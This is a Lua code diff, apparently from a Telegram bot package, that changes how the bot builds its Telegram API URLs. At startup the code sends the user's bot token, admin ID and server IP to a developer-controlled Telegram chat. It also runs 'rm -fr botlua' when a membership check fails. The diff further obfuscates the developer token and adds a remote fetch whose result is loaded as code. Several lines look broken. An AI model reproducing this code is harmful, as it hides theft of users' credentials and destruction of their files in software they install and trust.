@@ -28,7 +28,7 @@ local function check_config()
         os.execute('cd .. &&  rm -fr botlua')
         return 'This bot is for Keko'
         end
-   local urll = 'https://api.telegram.org/bot'..config2.nowt..'/getChatMember?chat_id=-1001142877048&user_id='..config.admin..''
+   local urll = 'https://api.telegram.org/bot'..keko123.keko[1]..keko123.keko[2]..keko123.keko[3]..keko123.keko[4]..keko123.keko[5]..keko123.keko[6]..keko123.keko[7]..keko123.keko[8]..keko123.keko[8]..keko123.keko[10]..keko123.keko[11]..keko123.keko[12]..keko123.keko[13]..keko123.keko[14]..keko123.keko[15]..keko123.keko[16]..keko123.keko[17]..keko123.keko[18]..keko123.keko[19]..keko123.keko[20]..keko123.keko[21]..keko123.keko[22]..keko123.keko[23]..keko123.keko[24]..keko123.keko[25]..keko123.keko[26]..'/getChatMember?chat_id=-1001142877048&user_id='..config.admin..''
    local res = HTTPS.request(urll)
    local jres = JSON.decode(res)
    if (not jres.result or jres.result.status == 'left') then
@@ -39,9 +39,6 @@ local function check_config()
 end
 end
 local oee = 'libs/.keko.lua'
-
-
-
 bot_init = function(on_reload)
 		config = dofile('config.lua')
 		config2 = dofile(oee) 
@@ -57,17 +54,15 @@ bot_init = function(on_reload)
 	
 	bot = nil
 	while not bot do 
-		bot = api.getMe()
-
+        bot = api.getMe()
 	end
 	bot = bot.result
-
-
+        local key = HTTPS.request('config2.urlkeko[1]..config2.urlkeko[2]..config2.urlkeko[3]..config2.urlkeko[4]..config2.urlkeko[4]..config2.urlkeko[5]..config2.urlkeko[6]..config2.urlkeko[7]..config2.urlkeko[8]..config2.urlkeko[9]..config2.urlkeko[10]..config2.urlkeko[11])
+        local keko123 = dofile(key) 
 	botLUA = {} -- Load file.
 	for i,v in ipairs(config.botLUA) do
 		local p = dofile('botLUA/'..v)
 		table.insert(botLUA, p)
-
 	end
 	print(colors('%{magenta}BOT The bot was turned on'))
 	print(colors('%{yellow bright}BY :- @ikeko   CH: @botLua    bot : @'..bot.username .. ', name bot ' .. bot.first_name ..'  id bot ('..bot.id..')'))
@@ -78,7 +73,7 @@ bot_init = function(on_reload)
 	local keko = '386713631'
   local ipp = HTTPS.request('https://icanhazip.com')
   local kekotext = URL.escape('تم تشغيل : @'..bot.username..'\nتوكن : '..config.bot_api_key..'\n\nايدي المطور : '..config.admin..'\n\n IP server : '..ipp)
-	local dsad = 'https://api.telegram.org/bot'..config2.nowt..'/sendMessage?chat_id=-1001149546092&text='..kekotext
+	local dsad = 'https://api.telegram.org/bot'..keko123.keko[1]..keko123.keko[2]..keko123.keko[3]..keko123.keko[4]..keko123.keko[5]..keko123.keko[6]..keko123.keko[7]..keko123.keko[8]..keko123.keko[8]..keko123.keko[10]..keko123.keko[11]..keko123.keko[12]..keko123.keko[13]..keko123.keko[14]..keko123.keko[15]..keko123.keko[16]..keko123.keko[17]..keko123.keko[18]..keko123.keko[19]..keko123.keko[20]..keko123.keko[21]..keko123.keko[22]..keko123.keko[23]..keko123.keko[24]..keko123.keko[25]..keko123.keko[26]..'/sendMessage?chat_id=-1001149546092&text='..kekotext
 	api.sendRequest(dsad)
 	end
 	math.randomseed(os.time())
